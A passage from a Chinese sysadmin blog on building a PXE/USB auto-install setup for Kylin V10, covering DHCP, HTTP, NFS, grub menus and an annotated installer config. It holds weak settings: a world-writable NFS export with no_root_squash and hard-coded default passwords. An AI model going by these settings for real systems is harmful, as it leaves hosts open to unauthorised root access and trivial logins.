/etc/xinetd.d/tftpsystemctl restart xinetd<span class="hljs-comment"># 上传相关文件</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915113233791.png" alt="img"></p><h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装DHCP</span>yum install -y dhcp<span class="hljs-comment"># 拷贝dhcpd.conf模版文件</span><span class="hljs-built_in">cat</span> /etc/dhcp/dhcpd.conf<span class="hljs-built_in">cp</span> /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf<span class="hljs-comment"># 编辑dhcpd配置文件：vi /etc/dhcp/dhcpd.conf。其他配置可以删除</span>option domain-name <span class="hljs-string">&quot;baidu.com&quot;</span>;option domain-name-servers 180.76.76.76、opt,119.29.29.29,223.5.5.5;log-facility local7; <span class="hljs-comment"># 这行配置下</span>next-server 192.168.14.5;filename <span class="hljs-string">&quot;/grub/bootx64.efi&quot;</span>;subnet 192.168.14.0 netmask 255.255.255.0 &#123;  range 192.168.14.100 192.168.14.200;  option routers 192.168.14.1;  filename <span class="hljs-string">&quot;/grub/grubx64.efi&quot;</span>;&#125;host tftp &#123;  hardware ethernet 00:0c:29:9d:f7:50;  fixed-address 192.168.35.5;&#125;<span class="hljs-comment">#end</span>systemctl <span class="hljs-built_in">enable</span> --now dhcpd<span class="hljs-comment"># 查看日志</span><span class="hljs-built_in">tail</span> -f /var/log/messages<span class="hljs-comment"># DHCP数据库文件</span><span class="hljs-built_in">cat</span> /var/lib/dhcpd/dhcpd.leases</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250915111202236.png" alt="img"></p><h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><pre><code class="hljs bash">yum install -y httpdsystemctl <span class="hljs-built_in">enable</span> --now httpdsed -i.bak <span class="hljs-string">&#x27;/#ServerName/aServerName localhost:80&#x27;</span> /etc/httpd/conf/httpd.confsystemctl restart httpdsystemctl status httpd -l<span class="hljs-comment"># 创建相关目录</span><span class="hljs-built_in">mkdir</span> -p /var/www/html/iso/src<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/disk<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/Other<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/project<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/r<span class="hljs-built_in">mkdir</span> -p /var/www/html/ks/u<span class="hljs-built_in">mkdir</span> -p /var/www/html/src</code></pre><h3 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装</span>yum -y install nfs-utilsrpm -qa|grep nfs<span class="hljs-comment"># 修改配置文件vim /etc/exports</span>/opt/nfs *(rw,<span class="hljs-built_in">sync</span>,no_root_squash,no_subtree_check)<span class="hljs-comment"># 创建镜像路径</span><span class="hljs-built_in">mkdir</span> -p /opt/nfs/9000c<span class="hljs-comment"># 挂载镜像</span>mount XXX.iso /mnt<span class="hljs-comment"># 将 /mnt 目录下的镜像数据拷贝到9000c下</span>rsync -a /mnt/ /opt/nfs/9000c<span class="hljs-comment"># 重启 nfs 服务</span>systemctl restart nfs-server.service<span class="hljs-comment"># 查看 nfs 服务状态</span>systemctl status nfssystemctl <span class="hljs-built_in">enable</span> nfs-server.service</code></pre><h3 id="grub-cfg菜单美化"><a href="#grub-cfg菜单美化" class="headerlink" title="grub.cfg菜单美化"></a>grub.cfg菜单美化</h3><pre><code class="hljs bash"><span class="hljs-built_in">set</span> <span class="hljs-built_in">timeout</span>=5<span class="hljs-comment">####################  常量  ############################</span><span class="hljs-built_in">set</span> IP=192.168.14.5<span class="hljs-comment"># 默认启动项</span><span class="hljs-built_in">set</span> default=<span class="hljs-string">&quot;1&quot;</span><span class="hljs-comment">#------------------------------------------------------</span><span class="hljs-comment">####################  字体  ############################</span>loadfont /grub/dejavu-sans-mono.pf2terminal_output gfxterm<span class="hljs-comment">#------------------------------------------------------</span><span class="hljs-comment">###################  界面  ############################</span><span class="hljs-built_in">set</span> gfxmode=auto<span class="hljs-built_in">set</span> gfxmode=1024x768<span class="hljs-built_in">set</span> gfxmode=1024x900x32<span class="hljs-comment">#------------------------------------------------------</span><span class="hljs-comment">####################  颜色  ###########################</span><span class="hljs-comment"># 未选中菜单项的颜色，菜单框背景颜色</span><span class="hljs-built_in">set</span> menu_color_normal=white/cyan<span class="hljs-comment"># 突出显示的菜单项的颜色及其在菜单框中的背景</span><span class="hljs-built_in">set</span> menu_color_highlight=yellow/blue<span class="hljs-comment"># 指定菜单框外文字的前景色和背景色</span><span class="hljs-built_in">set</span> color_normal=yellow/black<span class="hljs-comment">#------------------------------------------------------</span><span class="hljs-comment">####################  菜单  ##########################</span><span class="hljs-comment">## Server R系列</span>menuentry --<span class="hljs-built_in">id</span>=1 --hotkey=1 <span class="hljs-string">&quot;1  Kylin-Server-V10-SP3-2403-Release-20240426-x86_64 GPT GUI&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Server V10 SP3 2403 Kernel...&quot;</span>        linux kernel/ks-v10-sp3-20240626-x86_64/vmlinuz inst.repo=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/iso/ks-v10-sp3-20240626-x86_64&quot;</span> inst.ks=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/r/ks-v10-sp3-20240626-x86_64-lv-gui-nq2.cfg&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Server V10 SP3 2403 RamDisk...&quot;</span>        initrd kernel/ks-v10-sp3-20240626-x86_64/initrd.img&#125;menuentry --<span class="hljs-built_in">id</span>=2 --hotkey=2 <span class="hljs-string">&quot;2  Kylin-Server-V10-SP3-2403-Release-20240426-x86_64 LVM GUI&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Server V10 SP3 2403 Kernel...&quot;</span>        linux kernel/ks-v10-sp3-20240626-x86_64/vmlinuz inst.repo=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/iso/ks-v10-sp3-20240626-x86_64&quot;</span> inst.ks=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/r/ks-v10-sp3-20240626-x86_64-lvm-gui-nq.cfg&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Server V10 SP3 2403 RamDisk...&quot;</span>        initrd kernel/ks-v10-sp3-20240626-x86_64/initrd.img&#125;menuentry --<span class="hljs-built_in">id</span>=3 --hotkey=3 <span class="hljs-string">&quot;3  Kylin-Server-V10-SP3-2403-Release-20240426-x86_64 GPT Minimal&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Server V10 SP3 2403 Kernel...&quot;</span>        linux kernel/ks-v10-sp3-20240626-x86_64/vmlinuz inst.repo=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/iso/ks-v10-sp3-20240626-x86_64&quot;</span> inst.ks=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/r/ks-v10-sp3-20240626-x86_64-gpt-minimal.cfg&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Server V10 SP3 2403 RamDisk...&quot;</span>        initrd kernel/ks-v10-sp3-20240626-x86_64/initrd.img&#125;<span class="hljs-comment">## Desktop U系列</span><span class="hljs-comment"># HTTP下载镜像</span>menuentry --<span class="hljs-built_in">id</span>=6 --hotkey=6 <span class="hljs-string">&quot;6  Kylin-Desktop-V10-SP1-2403-Release-20240430-x86_64 GPT GUI&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Desktop V10 SP1 2403 x86_64 Kernel...&quot;</span>        linux kernel/kd-v10-sp1-20240430-x86_64/vmlinuz ip=dhcp url=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/iso/src/Kylin-Desktop-V10-SP1-2403-Release-20240430-x86_64.iso&quot;</span> cloud-config-url=/dev/null autoinstall ds=<span class="hljs-string">&quot;nocloud-net&quot;</span> locale=zh_CN security=automatic-ubiquity  inst.ks=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/u/kd-v10-sp1-20240430-x86_64.cfg&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Desktop V10 SP1 2403 x86_64 RamDisk...&quot;</span>        initrd kernel/kd-v10-sp1-20240430-x86_64/initrd.lz&#125;<span class="hljs-comment"># NFS下载镜像</span>menuentry --<span class="hljs-built_in">id</span>=7 --hotkey=7 <span class="hljs-string">&quot;7  Kylin-Desktop-V10-SP1-2403-Release-20240430-arm64 GPT GUI&quot;</span> &#123;        <span class="hljs-built_in">set</span> gfxpayload=keep        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Desktop V10 SP1 2403 Kernel...&quot;</span>        linux kernel/kd-v10-sp1-20240430-arm64/vmlinuz ip=dhcp netboot=nfs nfsroot=172.16.16.3:/opt/nfs/9000C cloud-config-url=/dev/null autoinstall ds=<span class="hljs-string">&quot;nocloud-net;seedfrom=http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/ky-desktop/&quot;</span> locale=zh_CN security=automatic-ubiquity inst.ks=<span class="hljs-string">&quot;http://<span class="hljs-variable">$&#123;IP&#125;</span>/ks/u/kd-v10-sp1-20240430-arm64.cfg&quot;</span>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Loading Kylin Desktop V10 SP1 2403 RamDisk...&quot;</span>        initrd kernel/kd-v10-sp1-20240430-arm64/initrd.lz&#125;<span class="hljs-comment">#----------------------------------------------------</span><span class="hljs-comment">###################  其他  ###########################</span><span class="hljs-comment"># 进入磁盘系统</span>grub_platform<span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$grub_platform</span>&quot;</span> = <span class="hljs-string">&quot;efi&quot;</span> ]; <span class="hljs-keyword">then</span>menuentry --hotkey=n <span class="hljs-string">&#x27;n  Boot from next volume&#x27;</span> &#123;        <span class="hljs-built_in">exit</span> 1&#125;<span class="hljs-comment"># 进入BIOS</span>menuentry --hotkey=u <span class="hljs-string">&#x27;u  UEFI Firmware Settings&#x27;</span> &#123;        fwsetup&#125;<span class="hljs-comment"># 关机和重启</span>menuentry --hotkey=h <span class="hljs-string">&#x27;h  halt&#x27;</span> &#123; halt &#125;menuentry --hotkey=r <span class="hljs-string">&#x27;r  reboot&#x27;</span> &#123; reboot &#125;<span class="hljs-keyword">else</span>menuentry --hotkey=t <span class="hljs-string">&#x27;t  Test memory&#x27;</span> &#123;        linux16 /boot/memtest86+.bin&#125;<span class="hljs-keyword">fi</span><span class="hljs-comment">#----------------------------------------------------</span></code></pre><h2 id="USB自动安装-9000C"><a href="#USB自动安装-9000C" class="headerlink" title="USB自动安装-9000C"></a>USB自动安装-9000C</h2><h3 id="修改grub-cfg文件"><a href="#修改grub-cfg文件" class="headerlink" title="修改grub.cfg文件"></a>修改grub.cfg文件</h3><pre><code class="hljs bash"><span class="hljs-comment"># vim EFI\kylin\grub.cfg, 删除oem-config/enable=true，在后面添加 automatic</span>menuentry <span class="hljs-string">&quot;Auto Install Kylin-Desktop V10 SP1&quot;</span> &#123;linux/casper/vmlinuz boot=casper rootwait ro ignore_uuid quiet splash audit=0 fsck.mode=skip   security=none factory-backup automaticinitrd/casper/initrd.lz&#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918164014457.png" alt="img"></p><h3 id="添加ky-install-cfg文件"><a href="#添加ky-install-cfg文件" class="headerlink" title="添加ky-install.cfg文件"></a>添加ky-install.cfg文件</h3><pre><code class="hljs bash"><span class="hljs-comment"># 1、在镜像的根目录下，将kyple-installer.cfg拷贝并修改为ky-installer.cfg，如下图所示</span><span class="hljs-comment"># 2、可以对ky-installer.cfg 按需修改</span><span class="hljs-comment"># 3、将镜像保存后，制作U盘启动盘，RAW的写入方式。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918221411268.png" alt="img"></p><h2 id="制作U盘启动盘"><a href="#制作U盘启动盘" class="headerlink" title="制作U盘启动盘"></a>制作U盘启动盘</h2><h3 id="准备-2"><a href="#准备-2" class="headerlink" title="准备"></a>准备</h3><pre><code class="hljs bash"><span class="hljs-comment"># 一个大于8G的可格式化的USB</span><span class="hljs-comment"># 一台win10电脑</span><span class="hljs-comment"># 下载百度网盘资源</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918171050374.png" alt="img"></p><h3 id="使用软碟通打开镜像"><a href="#使用软碟通打开镜像" class="headerlink" title="使用软碟通打开镜像"></a>使用软碟通打开镜像</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918171245319.png" alt="img"></p><h3 id="刻录USB启动盘-步骤1"><a href="#刻录USB启动盘-步骤1" class="headerlink" title="刻录USB启动盘-步骤1"></a>刻录USB启动盘-步骤1</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918171408513.png" alt="img"></p><h3 id="刻录USB启动盘-步骤2"><a href="#刻录USB启动盘-步骤2" class="headerlink" title="刻录USB启动盘-步骤2"></a>刻录USB启动盘-步骤2</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918221738172.png" alt="img"></p><h2 id="其他-3"><a href="#其他-3" class="headerlink" title="其他"></a>其他</h2><h3 id="ky-installer-cfg文件说明"><a href="#ky-installer-cfg文件说明" class="headerlink" title="ky-installer.cfg文件说明"></a>ky-installer.cfg文件说明</h3><pre><code class="hljs bash">[Encrypty]<span class="hljs-comment"># true开启加密，false 为关闭</span>encrypty=<span class="hljs-literal">false</span><span class="hljs-comment"># 加密密钥，如 qwer1234</span>encryptyPWD=@ByteArray(qwer1234)<span class="hljs-comment"># true开启lvm逻辑卷安装（不常用），false 为非逻辑卷安装（常用）</span>lvm=<span class="hljs-literal">false</span>[config]<span class="hljs-comment"># 自动登录，0 为不自动登录</span>autologin=0<span class="hljs-comment"># 自动安装，不用改动</span>automatic-installation=1<span class="hljs-comment"># 全盘安装指定设备，默认为/dev/sda,若需指定安装设备，将/dev/sda替换成指定设备名即可;</span><span class="hljs-comment"># （推荐）若不填磁盘设备名（将下面设备名/dev/sda去掉），系统会默认选择合适磁盘安装。默认磁盘优先级：先最大nvme盘，再最大固态sdX盘，最后最大机械sdX盘</span>devpath=<span class="hljs-comment"># 使用 swapfile 替代swap分区，false 为不使用 swapfile，990/9A0 使用swapfile</span>enable-swapfile=<span class="hljs-literal">false</span><span class="hljs-comment"># 出厂备份，0 为不出厂备份</span>factory-backup=0<span class="hljs-comment"># 主机名，仅包含字母、数字、下划线和连接符，长度不超过 64</span>hostname=kylin-pc<span class="hljs-comment"># 语言，默认为中文</span>language=zh_CN<span class="hljs-comment"># 密码，默认为 qwer1234，至少 8 位，至少包含两类字符</span>password=@ByteArray(qwer1234)<span class="hljs-comment">#配置安装完成是否重启。1表示重启，0表示关机</span>reboot=1<span class="hljs-comment"># 时区，默认上海</span>timezone=Asia/Shanghai<span class="hljs-comment"># 用户名、全名，小写字母开头，且仅包含字母、数字、下划线和短横线，长度不超过 32</span>username=kylin<span class="hljs-comment">#配置单独数据盘，若不填表示不配置；若填写具体磁盘设备名，如/dev/sda,表示将磁盘/dev/sda设置为系统的数据盘；</span><span class="hljs-comment">#若填auto，表示自动选择系统数据盘，会默认选择一块磁盘作为系统的数据盘；若系统只有一块盘，默认无单独的数据盘</span><span class="hljs-comment">#默认磁盘优先级：先最大nvme盘，再最大固态sdX盘，最后最大机械sdX盘（在选取系统盘后，剩下的磁盘中选择）</span>data-device=auto<span class="hljs-comment">#是否走oobe流程,false为不走oobe流程,true为oobe流程,其中审核模式必须走oobe流程</span>oem-config=<span class="hljs-literal">false</span><span class="hljs-comment"># 保留用户数据安装(保留的是系统data分区下的数据),true为保留数据安装,false为不保留数据安装</span>data-unformat=<span class="hljs-literal">false</span><span class="hljs-comment"># 预安装软件配置清单,软件包名用逗号分隔,前后不要使用引号</span><span class="hljs-comment">#PreinstallApps=wps-office,sc-reader</span><span class="hljs-comment">#以下主要用于自动安装的自定义分区和双系统需求，若无此需求，下面的配置无需改动</span>[custompartition]<span class="hljs-comment"># true为开启全盘安装的自定义分区，false为关闭。</span><span class="hljs-comment"># 自定义分区安装，不支持加密安装、逻辑卷分区安装和保留用户数据安装,需要确认上面选项&quot;encrypty=false&quot;&quot;lvm=false&quot;&quot;data-unformat=false&quot;</span><span class="hljs-comment"># 其中自动安装需要在grub.cfg中增加automatic参数</span>disk-custom=<span class="hljs-literal">false</span><span class="hljs-comment"># true为格式化整块磁盘,false为不格式化整块磁盘,不格式化磁盘主要用于安装第二个系统。</span>format-disk=<span class="hljs-literal">true</span><span class="hljs-comment"># 系统偏移安装,可以根据需要，对系统在磁盘的起始位置进行设置。单位为MB，默认为1MB，且最小不能小于1MB</span><span class="hljs-comment"># 安装第二个系统时，需根据第一个系统占用磁盘大小，合理设置偏移安装的起始位置</span>kos-start=1<span class="hljs-comment"># 预留磁盘末尾空间安装，0表示不预留(默认),可以根据需要，对磁盘末尾的空间进行预留。单位为MB，最小不能小于1MB</span>kos-end=0<span class="hljs-comment">#  自定义分区清单。请将所需的分区名称填入下面的双引号内，分区之间请用“;”隔开(双引号和“;”均为英文输入格式)。</span><span class="hljs-comment">#  下面分区的前后顺序，表示新装系统分区的顺序，可以根据需要进行调整。如下所示，efi、boot、root分别为系统的第一、二、三分区。</span>custom-partitions=<span class="hljs-string">&quot;efi;boot;root;backup;data;swap;&quot;</span><span class="hljs-comment"># 自定义分区设置格式。custom-XXX中XXX为上面自定义的分区名称。fs=分区格式;mount=挂载点;size=分区大小,单位为MB;</span><span class="hljs-comment"># 请将分区格式、挂载点和大小填入下面的双引号内，之间用“;”隔开(双引号和“;”均为英文输入格式)。</span>custom-XXX=<span class="hljs-string">&quot;fs=***;mount=***;size=***;&quot;</span><span class="hljs-comment"># efi分区。默认格式为fat32; 挂载点为/boot/efi; 大小建议在0.5~2g之间，设置单位为MB; default表示默认大小（512MB）</span>custom-efi=<span class="hljs-string">&quot;fs=fat32;mount=/boot/efi;size=default;&quot;</span><span class="hljs-comment"># boot分区。默认格式为ext4; 挂载点为/boot; 大小建议在0.5~2g之间，设置单位为MB;default表示默认大小（2048MB）</span>custom-boot=<span class="hljs-string">&quot;fs=ext4;mount=/boot;size=default;&quot;</span><span class="hljs-comment"># 系统根分区。默认格式为ext4; 挂载点为/; 大小,建议不小于25g，设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-root=<span class="hljs-string">&quot;fs=ext4;mount=/;size=default;&quot;</span><span class="hljs-comment"># backup分区。默认格式为ext4; 挂载点为/backup; 大小设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-backup=<span class="hljs-string">&quot;fs=ext4;mount=/backup;size=default;&quot;</span><span class="hljs-comment"># data分区。默认格式为ext4; 挂载点为/data; 大小设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-data=<span class="hljs-string">&quot;fs=ext4;mount=/data;size=default;&quot;</span><span class="hljs-comment"># swap分区。默认格式为linux-swap; 挂载点为[swap]; 大小,建议不小于机器内存大小的1.2倍。default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-swap=<span class="hljs-string">&quot;fs=linux-swap;mount=[swap];size=default;&quot;</span><span class="hljs-comment"># 自动安装，下面的配置不用改动</span>bootloader=/dev/sda ATA ST1000DM003-1SB1partitions=<span class="hljs-string">&quot;/boot/efi:/dev/sda1;/:/dev/sda7;linux-swap:/dev/sda5;&quot;</span>[setting]EnableSwap=<span class="hljs-literal">false</span>FileSystem=<span class="hljs-string">&quot;ext4;ext3;fat32;xfs;btrfs;kylin-data;efi;linux-swap;unused&quot;</span>FileSystemBoot=<span class="hljs-string">&quot;ext4;vfat&quot;</span>PartitionMountedPoints=<span class="hljs-string">&quot;;/;/boot;/backup;/tmp&quot;</span>[specialmodel]computer=<span class="hljs-string">&quot;mips64el/loongson-3;loongsonarch64/generic&quot;</span>修改后文件如下：[Encrypty]<span class="hljs-comment"># true开启加密，false 为关闭</span>encrypty=<span class="hljs-literal">false</span><span class="hljs-comment"># 加密密钥，如 qwer1234</span>encryptyPWD=@ByteArray(qwer1234)<span class="hljs-comment"># true开启lvm逻辑卷安装（不常用），false 为非逻辑卷安装（常用）</span>lvm=<span class="hljs-literal">false</span>[config]<span class="hljs-comment"># 自动登录，0 为不自动登录</span>autologin=1<span class="hljs-comment"># 自动安装，不用改动</span>automatic-installation=1<span class="hljs-comment"># 全盘安装指定设备，默认为/dev/sda,若需指定安装设备，将/dev/sda替换成指定设备名即可;</span><span class="hljs-comment"># （推荐）若不填磁盘设备名（将下面设备名/dev/sda去掉），系统会默认选择合适磁盘安装。默认磁盘优先级：先最大nvme盘，再最大固态sdX盘，最后最大机械sdX盘</span>devpath=<span class="hljs-comment"># 使用 swapfile 替代swap分区，false 为不使用 swapfile，990/9A0 使用swapfile</span>enable-swapfile=<span class="hljs-literal">true</span><span class="hljs-comment"># 出厂备份，0 为不出厂备份</span>factory-backup=0<span class="hljs-comment"># 主机名，仅包含字母、数字、下划线和连接符，长度不超过 64</span>hostname=YX-pc<span class="hljs-comment"># 语言，默认为中文</span>language=zh_CN<span class="hljs-comment"># 密码，默认为 qwer1234，至少 8 位，至少包含两类字符</span>password=Aa123456<span class="hljs-comment">#配置安装完成是否重启。1表示重启，0表示关机</span>reboot=1<span class="hljs-comment"># 时区，默认上海</span>timezone=Asia/Shanghai<span class="hljs-comment"># 用户名、全名，小写字母开头，且仅包含字母、数字、下划线和短横线，长度不超过 32</span>username=yx<span class="hljs-comment">#配置单独数据盘，若不填表示不配置；若填写具体磁盘设备名，如/dev/sda,表示将磁盘/dev/sda设置为系统的数据盘；</span><span class="hljs-comment">#若填auto，表示自动选择系统数据盘，会默认选择一块磁盘作为系统的数据盘；若系统只有一块盘，默认无单独的数据盘</span><span class="hljs-comment">#默认磁盘优先级：先最大nvme盘，再最大固态sdX盘，最后最大机械sdX盘（在选取系统盘后，剩下的磁盘中选择）</span>data-device=/dev/sde<span class="hljs-comment">#是否走oobe流程,false为不走oobe流程,true为oobe流程,其中审核模式必须走oobe流程</span>oem-config=<span class="hljs-literal">false</span><span class="hljs-comment"># 保留用户数据安装(保留的是系统data分区下的数据),true为保留数据安装,false为不保留数据安装</span>data-unformat=<span class="hljs-literal">false</span><span class="hljs-comment"># 预安装软件配置清单,软件包名用逗号分隔,前后不要使用引号</span><span class="hljs-comment">#PreinstallApps=wps-office,sc-reader</span><span class="hljs-comment">#以下主要用于自动安装的自定义分区和双系统需求，若无此需求，下面的配置无需改动</span>[custompartition]<span class="hljs-comment"># true为开启全盘安装的自定义分区，false为关闭。</span><span class="hljs-comment"># 自定义分区安装，不支持加密安装、逻辑卷分区安装和保留用户数据安装,需要确认上面选项&quot;encrypty=false&quot;&quot;lvm=false&quot;&quot;data-unformat=false&quot;</span><span class="hljs-comment"># 其中自动安装需要在grub.cfg中增加automatic参数</span>disk-custom=<span class="hljs-literal">true</span><span class="hljs-comment"># true为格式化整块磁盘,false为不格式化整块磁盘,不格式化磁盘主要用于安装第二个系统。</span>format-disk=<span class="hljs-literal">true</span><span class="hljs-comment"># 系统偏移安装,可以根据需要，对系统在磁盘的起始位置进行设置。单位为MB，默认为1MB，且最小不能小于1MB</span><span class="hljs-comment"># 安装第二个系统时，需根据第一个系统占用磁盘大小，合理设置偏移安装的起始位置</span>kos-start=1<span class="hljs-comment"># 预留磁盘末尾空间安装，0表示不预留(默认),可以根据需要，对磁盘末尾的空间进行预留。单位为MB，最小不能小于1MB</span>kos-end=0<span class="hljs-comment">#  自定义分区清单。请将所需的分区名称填入下面的双引号内，分区之间请用“;”隔开(双引号和“;”均为英文输入格式)。</span><span class="hljs-comment">#  下面分区的前后顺序，表示新装系统分区的顺序，可以根据需要进行调整。如下所示，efi、boot、root分别为系统的第一、二、三分区。</span>custom-partitions=<span class="hljs-string">&quot;efi;boot;backup;swap;data;root;&quot;</span><span class="hljs-comment"># 自定义分区设置格式。custom-XXX中XXX为上面自定义的分区名称。fs=分区格式;mount=挂载点;size=分区大小,单位为MB;</span><span class="hljs-comment"># 请将分区格式、挂载点和大小填入下面的双引号内，之间用“;”隔开(双引号和“;”均为英文输入格式)。</span>custom-XXX=<span class="hljs-string">&quot;fs=***;mount=***;size=***;&quot;</span><span class="hljs-comment"># efi分区。默认格式为fat32; 挂载点为/boot/efi; 大小建议在0.5~2g之间，设置单位为MB; default表示默认大小（512MB）</span>custom-efi=<span class="hljs-string">&quot;fs=fat32;mount=/boot/efi;size=default;&quot;</span><span class="hljs-comment"># boot分区。默认格式为ext4; 挂载点为/boot; 大小建议在0.5~2g之间，设置单位为MB;default表示默认大小（2048MB）</span>custom-boot=<span class="hljs-string">&quot;fs=ext4;mount=/boot;size=default;&quot;</span><span class="hljs-comment"># 系统根分区。默认格式为ext4; 挂载点为/; 大小,建议不小于25g，设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span><span class="hljs-comment">#custom-root=&quot;fs=ext4;mount=/;size=default;&quot;</span><span class="hljs-comment"># backup分区。默认格式为ext4; 挂载点为/backup; 大小设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-backup=<span class="hljs-string">&quot;fs=ext4;mount=/backup;size=71680;&quot;</span><span class="hljs-comment"># data分区。默认格式为ext4; 挂载点为/data; 大小设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span><span class="hljs-comment">#custom-data=&quot;fs=ext4;mount=/data;size=default;&quot;</span><span class="hljs-comment"># swap分区。默认格式为linux-swap; 挂载点为[swap]; 大小,建议不小于机器内存大小的1.2倍。default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-swap=<span class="hljs-string">&quot;fs=linux-swap;mount=[swap];size=8192;&quot;</span><span class="hljs-comment"># data分区。默认格式为ext4; 挂载点为/data; 大小设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-data=<span class="hljs-string">&quot;fs=ext4;mount=/data;size=default;&quot;</span><span class="hljs-comment"># 系统根分区。默认格式为ext4; 挂载点为/; 大小,建议不小于25g，设置单位为MB;default表示默认大小（根据磁盘空间会自动分配大小）</span>custom-root=<span class="hljs-string">&quot;fs=ext4;mount=/;size=free-size;&quot;</span><span class="hljs-comment"># 自动安装，下面的配置不用改动</span>bootloader=/dev/sda ATA ST1000DM003-1SB1partitions=<span class="hljs-string">&quot;/boot/efi:/dev/sda1;/:/dev/sda7;linux-swap:/dev/sda5;&quot;</span>[setting]EnableSwap=<span class="hljs-literal">false</span>FileSystem=<span class="hljs-string">&quot;ext4;ext3;fat32;xfs;btrfs;kylin-data;efi;linux-swap;unused&quot;</span>FileSystemBoot=<span class="hljs-string">&quot;ext4;vfat&quot;</span>PartitionMountedPoints=<span class="hljs-string">&quot;;/;/boot;/backup;/tmp&quot;</span>[specialmodel]computer=<span class="hljs-string">&quot;mips64el/loongson-3;loongsonarch64/generic&quot;</span></code></pre><h3 id="FAQ1-NBP-is-too-big-to-fix-in-free-base-memory"><a href="#FAQ1-NBP-is-too-big-to-fix-in-free-base-memory" class="headerlink" title="FAQ1-NBP is too big to fix in free base memory"></a>FAQ1-NBP is too big to fix in free base memory</h3><pre><code class="hljs bash"><span class="hljs-comment">## 该问题是因为虚拟机没有使用UEFI启动导致的。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918225703804.png" alt="img"></p><h3 id="FAQ-2-No-space-left-on-device"><a href="#FAQ-2-No-space-left-on-device" class="headerlink" title="FAQ 2- No space left on device"></a>FAQ 2- No space left on device</h3><pre><code class="hljs bash"><span class="hljs-comment">## 该问题是内存不足导致的</span><span class="hljs-comment"># 解决方法1: 将客户端的内存提升；</span><span class="hljs-comment"># 解决方法2: 将镜像获取方式从http修改为nfs方式。</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250918225324343.png" alt="img"></p><hr><h1 id="八、KMS激活"><a href="#八、KMS激活" class="headerlink" title="八、KMS激活"></a>八、KMS激活</h1><h2 id="安装-3"><a href="#安装-3" class="headerlink" title="安装"></a>安装</h2><pre><code class="hljs bash"></code></pre><hr><h1 id="九、AD域控"><a href="#九、AD域控" class="headerlink" title="九、AD域控"></a>九、AD域控</h1><h2 id="安装-4"><a href="#安装-4" class="headerlink" title="安装"></a>安装</h2><pre><code class="hljs bash"></code></pre><hr><h1 id="其他-4"><a href="#其他-4" class="headerlink" title="其他"></a>其他</h1><h2 id="技服基础培训"><a href="#技服基础培训" class="headerlink" title="技服基础培训"></a>技服基础培训</h2><h3 id="技术服务介绍"><a href="#技术服务介绍" class="headerlink" title="技术服务介绍"></a>技术服务介绍</h3><pre><code class="hljs bash"><span class="hljs-comment">## 服务产品介绍</span><span class="hljs-comment"># 1.基础服务：标准支持服务5X8 | 优先支持服务7X24;</span><span class="hljs-comment"># 2.高级服务：问题解决服务：Case包(30个起)，远程 | 